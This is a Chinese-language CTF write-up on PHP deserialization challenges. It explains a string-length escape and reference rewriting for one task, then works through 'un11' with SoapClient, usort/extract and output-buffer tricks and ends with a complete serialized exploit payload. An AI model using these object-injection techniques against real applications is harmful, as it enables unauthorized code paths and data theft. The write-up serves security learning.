- 构造长度55（11个`00*00`）的`test_1`,经过FileGetStr替换后变为，11个`\0*\0`长度33,长度减少22。这盈余的22个字符串会吃掉后面的`";s:6:"string";s:109:"`(长度22)，最终把b类对象解析为`a->string`的真实值。
- 接下来就要构造恶意b类对象，给b类添加一个构造函数`__construct`方便赋值。
```php
public function __construct($a, $function) {
        $this->a = $a;
        $this->function = $function;
    }
```
- 构造恶意b对象`$b = new b([&$b, "fly"], "1");` ,`new b(参数1,参数2)`是调用b类的自定义构造函数，给b的两个属性赋值。
- `[&$b, "fly"]`给b->a赋值可调用数组；
- `"1"`给b->function赋值为非空值，满足fly()输出flag的条件。虽然`$function`是protected属性，但是由于是在类里面赋值，是不受限制的。
- `$bbb = serialize($b);`的结果是`O:1:"b":2:{s:1:"a";a:2:{i:0;R:1;i:1;s:3:"fly";}s:11:"*function";s:1:"1";}`这里的`R:1`表示：`$b->a[0]` ,即`&$b`引用的是当前序列化串的第一个对象，当我们把`$b`的序列化串`$bbb`嵌入到`$a`的序列化串中后，**整个序列化的上下文变了**：`$b`不再是 “第 1 个对象”，而是`$a`序列化串中的「第 3 个对象」。所以要`$bbb = str_replace('R:1', 'r:3', $bbb);`
- `$bbb = str_replace('fly', "FLY", $bbb);`是为了绕过对`fly`的过滤，PHP反序列化对大小写不敏感，他只过滤了小写fly
- `test_2`直接设为空即可，不会有影响。
## un11
源码
```php
<?php  
include "flag11.php";  
error_reporting(0);  
  
class Flag{  
        static public $flag;  
        function __wakeup(){  
            global $flag;            self::$flag = $flag;  
        }  
        static function run($get){  
            if(run::$key != run::$re){  
                exit(unserialize($get)->run());  
            }else{  
                die('flag -> '.self::$flag);  
            }  
        }  
}  
  
class get{  
      
    function __construct(&$th1s){        $th1s->__class__ = Flag::$flag;  
    }  
    function run(){  
        global $__run__;        ob_start();  
        echo $__run__;  
    }  
}  
  
  
class run{  
      
    static public $key = 'you never know~';  
    static public $re = 'guess???';  
      
    function __destruct(){  
          
        if(Flag::$flag == ''){  
            exit();  
        }        usort($this->__function__ = array($this,$this->__function__),function($self,$func){return lcg_value() <= extract($self) ? new $self($func) : call_user_func($self);});  
        global $__run__;        $__run__ = (string)$this->__class__;        ob_end_clean();  
    }  
      
}  
  
if(isset($_REQUEST['data'])){    Flag::run($_REQUEST['data']);  
}else{    highlight_file(__FILE__);  
}  
  
  
?>
```
接收参数
```php
if(isset($_REQUEST['data'])){    Flag::run($_REQUEST['data']);
```
无法绕静态属性的值
```php
if(run::$key != run::$re){
```
反序列化结果会调用一个未知的方法
```php
exit(unserialize($get)->run());
```
<1>未知方法绕过 -> php7： 
可以通过构造形如数组 `unserialize([class1,class2]) -> ??()` 这样数组内的序列化 内容会被完整的序列化出来（比如__destruct 是可被执行的） 
<2>未知方法绕过 -> php5： 
可以通过构造形如 soap 的原生类，利用其自带的__call 魔法方法把未知方法给抵 消掉，这里显然只能用第 2 种方法（毕竟 Way 的环境给的是 php5 就非常邪恶！！！） 
<3>构造一个合适的 soap 类：
例如
```php
new SoapClient(null,array('location'=>'http://127.0.0.1/','uri'=>'2334'));
```
只需要简单的构造一个 soap 类即可。这时候 `unserialize($get)->run()` 这条语句就不 会爆出 Error 级的错误，也就是会继续往下进行。
并且由于 soap 类序列化后的内容全是 public 属性，同时在反序列化时如果给一个原本 不存在某个 public 属性的类额外添加上新的 public 值是不影响的。 再且 php 在反序列化嵌套类时序列化操作（也就是__wakeup）是从内到外（嵌套在里 边的类先进行反序列化），然后销毁时候（也就是__destruct）是从外到内（携带嵌套类的载 体类先进行__destruct）。 结合题目，这里可以使用 soap 类的某个 public 属性携带相应的 payload 去解题（这个 public 属性可以是自带的，额外的也是允许的）
**首先获取flag**
```php
static public $flag;  
        function __wakeup(){  
            global $flag;            
            self::$flag = $flag;  
        }，
```
很简单，只需要让 Flag 类反序列化就行了，
这个时候 Flag 类的`$flag` 静态属性的值就是 flag 的值，下一步是看如何获取这个 flag 的值。 显然在 get 类的__construct 方法种有一段 `$th1s->__class__ = Flag::$flag`的值获 取，并且由于传入的参数是 &$th1s ，那么作为参数传入的那个类的 __class__ 属性的 值就为 flag 了。
**构造获取**
根据上边的分析，显然得要把 get 类给 new 了，并且传入的参数为 run 类这样才 能由 get 的__construct 方法取到 flag，并传入 run 类的__class__属性中。
```php
usort($this->__function__ = array($this,$this->__function__),function($self,$func){return lcg_value() <= extract($self) ? new $self($func) : call_user_func($self);});
```
这里需要注意的点主要有 3 点： 
```
1. 首先要使得 $self = ‘get’ , $func = 类 run (也可以说是$this)； 
2. 然后是满足 lcg_value() <= extract($self)，lcg_value() 返回一个[0,1)的 值，只需要让 extract 返回 1 即可（也就是$self 成功被导入成变量了，形 如[‘a’=>’1’]这样
3. 这里可以看到这是一个将一个数组对应依次应用一个用户自定义函数的 进行比较。这里有个 trick，在 php5 中，这个用户自定义比较函数传入参 数 的 顺 序 是 反过来 的 ， 比 如 上 边 的 比 较 数 组 为 array($this,$this->__function__) ，用户比较函数的参数为 $self,$func ， 那么实际传入的值对为 $this=>$func，$this->__function__=>$self。
```
根据这几点，这里只需要构造一个满足以下属性值的 run 类即可： $this->__function__ = array(‘self’ => ‘get’) 这时候 new $self($func) 就相当于 new get($this) 了。 由于上边已经说了 get 类的__construct 方法会将 flag 赋值给传入的类的__class__ 属性，当这个 usort 执行完毕后，
__class__属性的值（也就是 flag）会传给 $__run__ 的全局变量，下一步即是如何读这个 $__run__ 的全局变量了。
**构造读flag**
<1>分析读逻辑： 
显而易见，在 get 类的 run 方法存在一个 echo $__run__ 全局变量，
```php
function run(){  
        global $__run__;        
        ob_start();  
        echo $__run__;  
    }
```
那么也就是要构造一个调用 get 类的 run 方法的操作了。 首先还是看 usort，这里存在一个 call_user_func，
```
右上边的分析可知$self 实际上就是$this->__function__的值，这里要保证 lcg_value()的 值>extract($self)，由于形如 array(‘x’,’y’)这样没有指定键值对或键的值是不符合变量命 名规范时 extract()函数由于无法导入变量会返回 0，只需要构造$this->__functon__的 值为数组 array(‘get’,’run’)就行了，。
```
**构造出错绕过ob_clean_end**
<1>ob_clean_end： 
虽然能够 echo 了携带 flag 的 $__run__ 全局变量的值，在 echo 前会有 ob_start(); 也就是将输出显示的值先放在 cache 里边，等到 ob_get_contents()之类的调用了才会 将 ob_start()函数开始后显示输出的值给输出。 然而在后边给的是 ob_clean_end()即是将 ob_start()放在 cache 的值给 clean 掉并 结束 ob，这样 flag 是显示不出来的。 不过由于先前调用了 ob_start();再把 flag 给 echo，此时 flag 的值是已经放在 cache里边了。此时如果引发了一个 Error 级的错误，终止了往下的处理，那么放在 cache 里 边的 flag 也就会显示出来。 那么只需要在 ob_end_clean()函数执行之前引发一个 Error 错误就好了，
```php
$__run__ = (string)$this->__class__;
```


```
而这里 $__run__ 是不可控的，不能够 global 一个字符串或$this 来引发 Error 级 错误。但这里有一句 (string)$this->__class__ 这实际上就是多此一举了，如果 $this->__class__的值为一个类，那么进行(string)转换时就会发生 Error 级错误。 那么第 2 个 run 类的属性为以下： $this->__function__ = array(‘self’ , ‘get’) $this->__class__ = new get() 非常之简单。
```
**最终payload构造**
<1>payload 大致格式： 
Soap 类{array(Flag 类，run 类 1，run 类 2)}
```php
<?php
class Flag{}
class get{}
class run{}

$f = new Flag();
$t1 = new run();
$t1->__function__ = array('self'=>'get');
$t2 = new run();
$t2->__function__ = array(new get(),'run');
$t2->__class__ = new get();
$s = new SoapClient(null,array('location'=>'http://127.0.0.1/','uri'=>'2334'));
$s->_soap_version = array($f,$t1,$t2);

echo serialize($s);
```
payload
```
?data=O:10:"SoapClient":3:{s:3:"uri";s:4:"2334";s:8:"location";s:17:"http://127.0.0.1/";s:13:"_soa
p_version";a:3:{i:0;O:4:"Flag":0:{}i:1;O:3:"run":1:{s:12:"__function__";a:1:{s:4:"self";s:3:"get"
;}}i:2;O:3:"run":2:{s:12:"__function__";a:2:{i:0;O:3:"get":0:{}i:1;s:3:"run";}s:9:"__class__";O:3:
"get":0:{}}}}
```
